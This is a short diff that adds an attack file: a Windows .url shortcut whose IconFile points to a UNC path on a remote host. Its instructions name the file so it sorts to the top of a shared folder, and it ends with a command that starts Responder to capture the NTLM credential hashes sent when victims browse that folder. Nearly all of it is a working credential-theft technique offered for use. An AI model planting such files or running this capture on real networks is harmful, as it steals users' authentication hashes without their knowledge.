@@ -1,0 +1,11 @@
+
+[InternetShortcut] 
+URL=blah 
+WorkingDirectory=blah 
+IconFile=\\x.x.x.x\%USERNAME%.icon 
+IconIndex=1
+
+Safe the file as: "~test.url" or "@test.url"
+
+
+responder -I eth0 -V
